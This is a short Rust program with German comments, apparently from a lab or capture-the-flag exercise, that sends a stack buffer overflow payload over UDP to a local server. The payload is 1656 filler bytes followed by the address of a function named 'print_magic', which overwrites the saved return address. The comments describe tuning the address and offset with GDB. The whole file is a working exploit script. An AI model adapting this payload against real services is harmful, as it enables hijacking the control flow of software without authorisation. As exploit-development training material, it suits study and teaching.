use std::net::UdpSocket;

fn main() {
    let socket = UdpSocket::bind("127.0.0.1:0").expect("Couldn't bind to address");

    // Adresse von `print_magic`, die vom Server ausgegeben wird
    let print_magic_address: u64 = 0x55555555e530; // Aktualisiere dies basierend auf der Serverausgabe

    // Berechneter Offset zur Rücksprungadresse
    let offset_to_rip = 1656; // Passe diesen Wert basierend auf GDB-Analyse an

    // Exploit-Payload erstellen
    let mut payload = vec![0x42u8; offset_to_rip]; // Fülle den Stack bis zur Rücksprungadresse
    payload.extend_from_slice(&print_magic_address.to_le_bytes()); // Schreibe die Adresse von `print_magic`

    // Exploit senden
    socket
        .send_to(&payload, "127.0.0.1:3400")
        .expect("Couldn't send exploit payload");

    println!("Exploit payload sent!");
}
